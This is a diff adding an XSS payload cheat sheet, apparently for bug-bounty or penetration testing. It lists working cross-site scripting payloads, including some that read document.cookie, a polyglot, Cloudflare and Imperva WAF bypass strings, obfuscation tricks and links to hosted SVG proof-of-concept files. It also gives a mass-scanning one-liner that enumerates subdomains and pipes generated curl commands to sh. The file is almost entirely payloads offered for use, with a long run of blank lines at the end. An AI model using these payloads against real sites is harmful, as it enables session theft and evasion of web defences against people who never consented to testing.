@@ -1,0 +1,178 @@
+Payload:"><img src=x onerror=prompt(document.cookie)>
+Payload: lookhere');});</script><img src=x onerror=alert('XSS')>
+Basic Payloads : "><A%0aoNMOusEoVER%09=%09(prompt(document.domain,document.cookie))``%0dx>
+Payload: %22%3E%3Cscript%3Ealert(1)%3C/script%3E
+
+----------
+Here's a small #XSS list for manual testing (main cases, high success rate).
+"><img src onerror=alert(1)>
+"autofocus onfocus=alert(1)//
+</script><script>alert(1)</script>
+'-alert(1)-'
+\'-alert(1)//
+javascript:alert(1)
+
+Try it on:
+- URL query, fragment & path;
+- all input fields.
+---------------------
+<svg onload='alert(1)'
+<svg onload="alert(1)"
+<svg onload=alert(1)//
+<svg onload=alert(1)+
+<svg onload=alert(1)<!--
+---------------------
+JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
+---------------------
+
+#CloudFlare #WAF bypass
+Payload: <Svg Only=1 OnLoad=confirm(1)>
+---------------------------------------
+Brute SVG Collection
+=> use in uploads or regular input.
+
+XSS (no image)
+https://brutelogic.com.br/poc.svg
+
+XSS (valid image)
+https://brutelogic.com.br/brute.svg
+
+Redirect (default)
+https://brutelogic.com.br/redir.svg
+--------------------------------------
+Imperva WAF 
+#XSS #Bypass
+<svg><set onbegin=d=document,b='`',d['loca'+'tion']='javascript&colon;aler'+'t'+b+domain+b>
+-------------------------------------
+Quotes filtered or escaped? Use source:
+<svg><set onbegin=d=document,b=/`/.source,d[/loca/.source+/tion/.source]=/javascript&colon;aler/.source+/t/.source+b+domain+b>
+------------------------------------
+THE BEST TOOL XSS !
+echo "domain" | subfinder -silent | gauplus | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss[.]me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIKNOXSS\""}' | sh 
+-----------------------------------
+Basic Obfuscation techniques for crafting XSS payloads:
+Case sensitivity: 
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+No script/closing tag:
+<img/src/onerror=alert(1)
+Malformed tags (img):
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
+------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
